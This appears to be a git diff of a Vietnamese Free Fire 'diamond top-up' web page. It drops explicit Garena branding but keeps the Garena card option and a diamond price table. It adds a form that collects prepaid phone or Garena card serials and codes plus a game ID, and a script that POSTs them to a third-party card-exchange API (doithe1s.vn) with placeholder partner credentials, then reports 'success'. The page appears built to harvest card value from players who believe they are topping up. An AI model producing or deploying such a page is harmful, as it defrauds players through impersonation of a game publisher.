@@ -3,38 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nạp thẻ Garena</title>
+  <title>Nạp Kim Cương</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
-  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/e/e8/Garena_logo.png">
 </head>
-<body class="bg-gray-900 text-white">
-  <!-- Header -->
-  <div class="bg-black p-4 flex justify-between items-center">
-    <div class="text-red-600 text-xl font-bold">Garena</div>
-    <div class="text-sm">Chăm sóc khách hàng</div>
-  </div>
-
-  <!-- Quay lại -->
-  <div class="p-4">
-    <a href="index.html" class="text-red-500 hover:underline">&larr; Quay lại Trang chủ</a>
-  </div>
-
-  <!-- Banner ShopeePay -->
-  <div class="px-4">
-    <img src="https://dl.dir.freefiremobile.com/common/Local/VN/2025/04/SPPApril900x340.png" alt="ShopeePay" class="w-full rounded">
-  </div>
-
-  <!-- Game đang chọn -->
-  <div class="p-4 flex items-center space-x-2">
-    <img src="https://cdn-gop.garenanow.com/gop/app/0000/100/067/icon.png" class="w-10 h-10 rounded">
-    <span class="text-lg font-semibold">Free Fire</span>
-  </div>
-
-  <!-- Danh sách phương thức thanh toán -->
-  <div class="grid grid-cols-2 md:grid-cols-4 gap-4 px-4">
-    <div class="bg-gray-800 p-3 rounded text-center border border-red-500">Thẻ điện thoại</div>
-    <div class="bg-gray-800 p-3 rounded text-center">Thẻ Garena</div>
-  </div>
+<body class="bg-gray-900 text-white font-sans">
 
   <!-- Hướng dẫn -->
   <div class="p-4 text-sm">
@@ -42,11 +14,107 @@
     <span class="text-red-400">Dùng tài khoản thanh toán, bạn mới nhận được ưu đãi giảm 15% tới đa 50.000Đ...</span>
   </div>
 
-  <!-- Footer -->
-  <div class="text-center text-xs text-gray-400 py-4">
-    CÔNG TY CỔ PHẦN GARENA<br>
-    Giấy CNĐKDN số 0103595912 | Địa chỉ: Tầng 5, Tháp 2, Capital Place, Hà Nội, Việt Nam<br>
-    <a href="#" class="underline">Câu hỏi thường gặp</a> · <a href="#" class="underline">Điều khoản</a> · <a href="#" class="underline">Chính sách bảo mật</a>
+  <!-- Bảng nạp kim cương -->
+  <div class="p-4">
+    <table class="w-full text-sm text-white">
+      <thead>
+        <tr class="text-gray-400 border-b border-gray-600">
+          <th class="text-left py-2">Giá</th>
+          <th class="text-left">Thêm điểm</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td><input type="radio" name="price" value="5000"> 5 000 ₫</td><td>Kim Cương × 25</td></tr>
+        <tr><td><input type="radio" name="price" value="10000"> 10 000 ₫</td><td>Kim Cương × 51</td></tr>
+        <tr><td><input type="radio" name="price" value="20000"> 20 000 ₫</td><td>Kim Cương × 113</td></tr>
+        <tr><td><input type="radio" name="price" value="50000"> 50 000 ₫</td><td>Kim Cương × 283</td></tr>
+        <tr><td><input type="radio" name="price" value="100000"> 100 000 ₫</td><td>Kim Cương × 566</td></tr>
+        <tr><td><input type="radio" name="price" value="200000"> 200 000 ₫</td><td>Kim Cương × 1 132</td></tr>
+        <tr><td><input type="radio" name="price" value="500000"> 500 000 ₫</td><td>Kim Cương × 2 830</td></tr>
+        <tr><td><input type="radio" name="price" value="1000000"> 1 000 000 ₫</td><td>Kim Cương × 5 750</td></tr>
+        <tr><td><input type="radio" name="price" value="2000000"> 2 000 000 ₫</td><td>Kim Cương × 11 500</td></tr>
+      </tbody>
+    </table>
   </div>
+
+  <!-- Phương thức thanh toán -->
+  <div class="grid grid-cols-2 md:grid-cols-4 gap-4 px-4">
+    <label class="bg-gray-800 p-3 rounded text-center border cursor-pointer">
+      <input type="radio" name="method" class="hidden" value="card"> <span>Thẻ điện thoại</span>
+    </label>
+    <label class="bg-gray-800 p-3 rounded text-center border cursor-pointer">
+      <input type="radio" name="method" class="hidden" value="garena"> <span>Thẻ Garena</span>
+    </label>
+  </div>
+
+  <!-- Form nạp thẻ -->
+  <div class="px-4 py-6">
+    <div class="grid gap-4">
+      <select id="card-type" class="bg-gray-800 p-2 rounded border border-gray-600">
+        <option value="">Chọn loại thẻ</option>
+        <option value="Viettel">Viettel</option>
+        <option value="Vinaphone">Vinaphone</option>
+        <option value="Mobifone">Mobifone</option>
+        <option value="Garena">Garena</option>
+      </select>
+
+      <select id="card-value" class="bg-gray-800 p-2 rounded border border-gray-600">
+        <option value="">Chọn mệnh giá</option>
+        <option value="10000">10.000đ</option>
+        <option value="20000">20.000đ</option>
+        <option value="50000">50.000đ</option>
+        <option value="100000">100.000đ</option>
+        <option value="200000">200.000đ</option>
+        <option value="500000">500.000đ</option>
+      </select>
+
+      <input id="card-seri" type="text" placeholder="Nhập số seri" class="bg-gray-800 p-2 rounded border border-gray-600">
+      <input id="card-code" type="text" placeholder="Nhập mã thẻ" class="bg-gray-800 p-2 rounded border border-gray-600">
+      <input id="game-id" type="text" placeholder="Nhập ID game" class="bg-gray-800 p-2 rounded border border-gray-600">
+
+      <button onclick="submitCard()" class="bg-red-600 hover:bg-red-700 p-2 rounded text-white font-semibold">Nạp kim cương</button>
+    </div>
+  </div>
+
+  <script>
+    function submitCard() {
+      const type = document.getElementById('card-type').value;
+      const value = document.getElementById('card-value').value;
+      const seri = document.getElementById('card-seri').value;
+      const code = document.getElementById('card-code').value;
+      const gameId = document.getElementById('game-id').value;
+
+      if (!type || !value || !seri || !code || !gameId) {
+        alert("Vui lòng nhập đầy đủ thông tin!");
+        return;
+      }
+
+      const payload = {
+        telco: type,
+        code: code,
+        serial: seri,
+        amount: value,
+        content: gameId,
+        request_id: Date.now().toString(),
+        partner_id: "YOUR_PARTNER_ID",
+        sign: "SIGN_HERE"
+      };
+
+      fetch("https://doithe1s.vn/api/card", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert("Nạp thành công: " + JSON.stringify(data));
+      })
+      .catch(err => {
+        alert("Lỗi khi nạp thẻ!");
+        console.error(err);
+      });
+    }
+  </script>
+
 </body>
 </html>
